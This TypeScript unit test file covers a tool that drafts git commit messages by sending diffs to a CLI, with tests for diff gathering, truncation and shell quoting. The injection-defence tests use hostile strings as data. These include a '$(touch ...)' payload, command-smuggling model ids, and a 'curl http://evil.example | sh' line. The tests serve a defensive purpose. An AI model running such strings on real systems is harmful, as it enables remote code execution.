// ── Unit tests for commit-message drafting ──────────────────────────────────

import * as assert from "assert";
import * as path from "node:path";
import {
	MAX_DIFF_CHARS,
	COMMIT_MESSAGE_PROMPT,
	PI_PRINT_ARGS,
	buildDiffInput,
	countUntracked,
	draftCommitMessage,
	findRepositoryRoot,
	gitCommitMessageInternals,
	normalizeCommitMessage,
	truncatePatch,
	type CommitMessageOutcome,
} from "../../../git-commit-message.js";
import { quoteShellArg, type CommandResult, type ShellExecOptions } from "../../../utils/shell.js";

const ok = (stdout: string): CommandResult => ({ code: 0, stdout, stderr: "" });
const fail = (stderr: string, code = 1): CommandResult => ({
	code,
	stdout: "",
	stderr,
});

interface Harness {
	gitCalls: { args: string[]; options?: ShellExecOptions }[];
	piCalls: {
		command: string;
		args: string[];
		stdin: string;
		options?: ShellExecOptions;
	}[];
	restore: () => void;
}

/** Stub the module seams; every call is recorded for assertions. */
function harness(options: {
	exists?: (target: string) => boolean;
	git?: Record<string, CommandResult>;
	pi?: (args: string[], stdin: string) => CommandResult;
}): Harness {
	const previous = { ...gitCommitMessageInternals };
	const gitCalls: Harness["gitCalls"] = [];
	const piCalls: Harness["piCalls"] = [];

	gitCommitMessageInternals.existsSync = options.exists ?? (() => false);
	gitCommitMessageInternals.execFileAsync = async (
		_command: string,
		args: string[],
		_timeoutMs?: number,
		shellOptions?: ShellExecOptions,
	) => {
		gitCalls.push({ args, options: shellOptions });
		return options.git?.[args.join(" ")] ?? ok("");
	};
	gitCommitMessageInternals.execFileWithStdin = async (
		command: string,
		args: string[],
		stdin: string,
		_timeoutMs?: number,
		shellOptions?: ShellExecOptions,
	) => {
		piCalls.push({ command, args, stdin, options: shellOptions });
		return options.pi ? options.pi(args, stdin) : ok("chore: draft\n");
	};

	return {
		gitCalls,
		piCalls,
		restore: () => Object.assign(gitCommitMessageInternals, previous),
	};
}

const gitArgsOf = (h: Harness) => h.gitCalls.map((call) => call.args.join(" "));

suite("git-commit-message", () => {
	let h: Harness;

	teardown(() => h?.restore());

	suite("findRepositoryRoot", () => {
		test("returns the directory holding a .git directory", () => {
			const cwd = path.join(path.sep, "repo");
			h = harness({
				exists: (target) => target === path.join(cwd, ".git"),
			});
			assert.strictEqual(findRepositoryRoot(cwd), cwd);
		});

		test("walks up past nested directories to the repository root", () => {
			const root = path.join(path.sep, "repo");
			const cwd = path.join(root, "packages", "app", "src");
			h = harness({
				exists: (target) => target === path.join(root, ".git"),
			});
			assert.strictEqual(findRepositoryRoot(cwd), root);
		});

		test("accepts a .git file (submodule / worktree pointer)", () => {
			const root = path.join(path.sep, "repo");
			h = harness({
				exists: (target) => target === path.join(root, ".git"),
			});
			assert.strictEqual(findRepositoryRoot(root), root);
		});

		test("returns null when no .git exists up to the filesystem root", () => {
			h = harness({ exists: () => false });
			assert.strictEqual(findRepositoryRoot(path.join(path.sep, "tmp", "nope")), null);
		});
	});

	suite("git content gathering", () => {
		test("makes no model request when the working tree is clean", async () => {
			h = harness({
				exists: () => true,
				git: { "status --porcelain": ok("") },
			});
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			});

			assert.deepStrictEqual(outcome, {
				status: "nothing-to-commit",
				untrackedCount: 0,
			});
			assert.strictEqual(h.piCalls.length, 0, "model must not be called");
			assert.deepStrictEqual(gitArgsOf(h), ["status --porcelain"]);
		});

		test("sends the staged stat summary and staged patch", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("diff --git a/src/a.ts b/src/a.ts\n+added\n"),
				},
			});
			const outcome = (await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			})) as Extract<CommitMessageOutcome, { status: "message" }>;

			assert.strictEqual(outcome.status, "message");
			assert.strictEqual(outcome.truncated, false);
			const stdin = h.piCalls[0].stdin;
			assert.ok(stdin.includes("src/a.ts | 2 +-"), "stat summary must be sent");
			assert.ok(stdin.includes("+added"), "staged patch must be sent");
			assert.ok(!gitArgsOf(h).includes("diff HEAD"), "no HEAD fallback when staged");
		});

		test("falls back to the worktree diff when nothing is staged", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok(" M src/b.ts\n"),
					"diff --staged --stat": ok(""),
					"diff --staged": ok(""),
					"diff HEAD --stat": ok(" src/b.ts | 1 +\n"),
					"diff HEAD": ok("diff --git a/src/b.ts b/src/b.ts\n+worktree\n"),
				},
			});
			const outcome = (await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			})) as Extract<CommitMessageOutcome, { status: "message" }>;

			assert.strictEqual(outcome.status, "message");
			const args = gitArgsOf(h);
			assert.ok(args.includes("diff HEAD --stat"));
			assert.ok(args.includes("diff HEAD"));
			assert.ok(h.piCalls[0].stdin.includes("+worktree"));
		});

		test("prefers the staged patch when both staged and unstaged changes exist", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n M src/b.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+STAGED-ONLY\n"),
					"diff HEAD --stat": ok(" src/b.ts | 1 +\n"),
					"diff HEAD": ok("+UNSTAGED-MUST-NOT-BE-SENT\n"),
				},
			});
			await draftCommitMessage({ cwd: "/repo", binaryPath: "pi", model: "" });

			const stdin = h.piCalls[0].stdin;
			assert.ok(stdin.includes("+STAGED-ONLY"));
			assert.ok(!stdin.includes("UNSTAGED-MUST-NOT-BE-SENT"));
			assert.ok(!gitArgsOf(h).includes("diff HEAD"));
		});

		test("reports nothing to commit for an untracked-only tree without calling the model", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("?? new1.txt\n?? new2.txt\n"),
					"diff --staged --stat": ok(""),
					"diff --staged": ok(""),
					"diff HEAD --stat": ok(""),
					"diff HEAD": ok(""),
				},
			});
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			});

			assert.deepStrictEqual(outcome, {
				status: "nothing-to-commit",
				untrackedCount: 2,
			});
			assert.strictEqual(h.piCalls.length, 0);
		});

		test("truncates a large patch while keeping the full stat summary", async () => {
			const bigPatch = `+${"x".repeat(MAX_DIFF_CHARS + 500)}`;
			const stat = " src/huge.ts | 40000 ++++++++++\n";
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/huge.ts\n"),
					"diff --staged --stat": ok(stat),
					"diff --staged": ok(bigPatch),
				},
			});
			const outcome = (await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			})) as Extract<CommitMessageOutcome, { status: "message" }>;

			assert.strictEqual(outcome.truncated, true);
			const stdin = h.piCalls[0].stdin;
			assert.ok(stdin.includes(stat.trim()), "stat summary must survive truncation");
			assert.ok(
				stdin.includes(`truncated at ${MAX_DIFF_CHARS} characters`),
				"truncation must be disclosed to the model",
			);
			assert.ok(
				stdin.length < bigPatch.length,
				"the sent payload must be smaller than the raw patch",
			);
		});

		test("surfaces the untracked-file count alongside the draft", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n?? one.txt\n?? two.txt\n?? three.txt\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
			});
			const outcome = (await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			})) as Extract<CommitMessageOutcome, { status: "message" }>;

			assert.strictEqual(outcome.untrackedCount, 3);
			assert.ok(
				h.piCalls[0].stdin.includes("3 untracked file(s)"),
				"the model should know untracked files are excluded",
			);
		});

		test("passes only fixed literal git arguments", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
			});
			await draftCommitMessage({ cwd: "/repo", binaryPath: "pi", model: "" });

			const allowed = new Set([
				"status --porcelain",
				"diff --staged --stat",
				"diff --staged",
				"diff HEAD --stat",
				"diff HEAD",
			]);
			for (const args of gitArgsOf(h)) {
				assert.ok(allowed.has(args), `unexpected git argument set: ${args}`);
			}
		});

		test("reports a failed git command instead of drafting", async () => {
			h = harness({
				exists: () => true,
				git: { "status --porcelain": fail("fatal: not a git repository") },
			});
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			});

			assert.deepStrictEqual(outcome, {
				status: "error",
				message: "fatal: not a git repository",
			});
			assert.strictEqual(h.piCalls.length, 0);
		});

		test("reports a missing repository without touching git", async () => {
			h = harness({ exists: () => false });
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			});

			assert.strictEqual(outcome.status, "error");
			assert.strictEqual(h.gitCalls.length, 0);
		});
	});

	suite("CLI drafting call", () => {
		test("sends a literal argument array and delivers the diff on stdin", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+$(touch /tmp/PWNED)\n"),
				},
			});
			await draftCommitMessage({ cwd: "/repo", binaryPath: "pi", model: "" });

			const call = h.piCalls[0];
			assert.strictEqual(call.command, "pi");
			// The prompt is quoted: unquoted, the shell word-splits it and its
			// parentheses are a syntax error, so the CLI would never start.
			assert.deepStrictEqual(call.args, [
				...PI_PRINT_ARGS,
				quoteShellArg(COMMIT_MESSAGE_PROMPT),
			]);
			assert.ok(
				call.stdin.includes("$(touch /tmp/PWNED)"),
				"the diff must travel via stdin, byte-preserved",
			);
			// No argument may carry repository-derived content.
			for (const arg of call.args) {
				assert.ok(
					!arg.includes("PWNED") && !arg.includes("src/a.ts"),
					`argv leaked repository content: ${arg}`,
				);
			}
			assert.strictEqual(call.options?.cwd, "/repo");
		});

		test("omits --model when no override is configured", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
			});
			await draftCommitMessage({ cwd: "/repo", binaryPath: "pi", model: "" });

			assert.ok(!h.piCalls[0].args.includes("--model"));
		});

		test("passes --model quoted, so a spaced model id arrives as one argument", async () => {
			// Model ids reported by the CLI contain spaces (`Bitfrost/Kilo Code/…`).
			// Unquoted they are word-split, so the override has to be rendered as a
			// single literal argument rather than passed through raw.
			for (const model of [
				"anthropic/claude-haiku-4-5",
				"Bitfrost/Kilo Code/aion-labs/aion-2.0",
			]) {
				h = harness({
					exists: () => true,
					git: {
						"status --porcelain": ok("M  src/a.ts\n"),
						"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
						"diff --staged": ok("+added\n"),
					},
				});
				await draftCommitMessage({ cwd: "/repo", binaryPath: "pi", model });

				const args = h.piCalls[0].args;
				const index = args.indexOf("--model");
				assert.ok(index >= 0, "--model must be present");
				assert.strictEqual(args[index + 1], quoteShellArg(model));
			}
		});

		// The setting can come from a repository's `.vscode/settings.json`, and the
		// argument list is joined into a `shell: true` command line. The value is
		// therefore quoted, so shell syntax in it stays literal text.
		test("quotes a model override carrying shell syntax instead of letting it execute", async () => {
			for (const hostile of [
				"anthropic/x; touch /tmp/INJECTED",
				"anthropic/$(touch /tmp/INJECTED)",
				"anthropic/x && curl http://evil.example | sh",
				"anthropic/x`touch /tmp/INJECTED`",
			]) {
				h = harness({
					exists: () => true,
					git: {
						"status --porcelain": ok("M  src/a.ts\n"),
						"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
						"diff --staged": ok("+added\n"),
					},
				});

				await draftCommitMessage({ cwd: "/repo", binaryPath: "pi", model: hostile });

				const args = h.piCalls[0].args;
				const index = args.indexOf("--model");
				assert.strictEqual(
					args[index + 1],
					quoteShellArg(hostile),
					`the value must be quoted so the shell cannot act on it: ${hostile}`,
				);
				// A quoted value is one argv element and contains no unquoted `;`, so
				// the shell cannot see a second command.
				assert.ok(
					(args[index + 1] as string).startsWith("'") &&
						(args[index + 1] as string).endsWith("'"),
					"the value must be single-quoted for a POSIX shell",
				);
			}
		});

		test("refuses an unquotable model override without invoking the model", async () => {
			// The only unconditionally unpresentable value is one that exceeds the
			// bound; the Windows-unquotable characters are covered by the guard suite.
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
			});

			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "anthropic/" + "a".repeat(220),
			});

			assert.strictEqual(outcome.status, "error");
			assert.strictEqual(h.piCalls.length, 0, "an unpresentable model must not be invoked");
		});

		test("returns the drafted message verbatim", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
				pi: () => ok("feat(scm): draft commit messages\n\nBody line.\n"),
			});
			const outcome = (await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			})) as Extract<CommitMessageOutcome, { status: "message" }>;

			assert.strictEqual(outcome.message, "feat(scm): draft commit messages\n\nBody line.");
		});

		test("reports stderr verbatim on a non-zero exit", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
				pi: () => fail("unknown model: nope/nope"),
			});
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "nope/nope",
			});

			assert.deepStrictEqual(outcome, {
				status: "error",
				message: "unknown model: nope/nope",
			});
		});

		test("reports a timeout as a distinct outcome", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
				pi: () => fail("Command timed out after 60000ms: pi -p"),
			});
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			});

			assert.strictEqual(outcome.status, "timeout");
		});

		test("reports an empty model reply as an error", async () => {
			h = harness({
				exists: () => true,
				git: {
					"status --porcelain": ok("M  src/a.ts\n"),
					"diff --staged --stat": ok(" src/a.ts | 2 +-\n"),
					"diff --staged": ok("+added\n"),
				},
				pi: () => ok("   \n\n"),
			});
			const outcome = await draftCommitMessage({
				cwd: "/repo",
				binaryPath: "pi",
				model: "",
			});

			assert.strictEqual(outcome.status, "error");
		});
	});

	suite("pure helpers", () => {
		test("normalizeCommitMessage unwraps a fenced reply", () => {
			assert.strictEqual(normalizeCommitMessage("```\nfeat: thing\n```"), "feat: thing");
			assert.strictEqual(
				normalizeCommitMessage("```text\nfeat: thing\n```\n"),
				"feat: thing",
			);
		});

		test("normalizeCommitMessage trims an unfenced reply", () => {
			assert.strictEqual(normalizeCommitMessage("\n  feat: thing\n\n"), "feat: thing");
		});

		test("normalizeCommitMessage leaves an inner fence in place", () => {
			const body = "feat: thing\n\n```ts\nconst a = 1;\n```";
			assert.strictEqual(normalizeCommitMessage(body), body);
		});

		test("truncatePatch reports whether the patch was cut", () => {
			assert.deepStrictEqual(truncatePatch("abc", 10), {
				patch: "abc",
				truncated: false,
			});
			assert.deepStrictEqual(truncatePatch("abcdef", 3), {
				patch: "abc",
				truncated: true,
			});
		});

		test("countUntracked counts only ?? entries", () => {
			assert.strictEqual(countUntracked("M  a.ts\n?? b.ts\n?? c.ts\n M d.ts\n"), 2);
			assert.strictEqual(countUntracked(""), 0);
		});

		test("buildDiffInput always leads with the stat summary", () => {
			const input = buildDiffInput("stat-line", "patch-line", false, 0);
			assert.ok(input.startsWith("stat-line"));
			assert.ok(input.includes("patch-line"));
			assert.ok(!input.includes("truncated"));
		});
	});
});
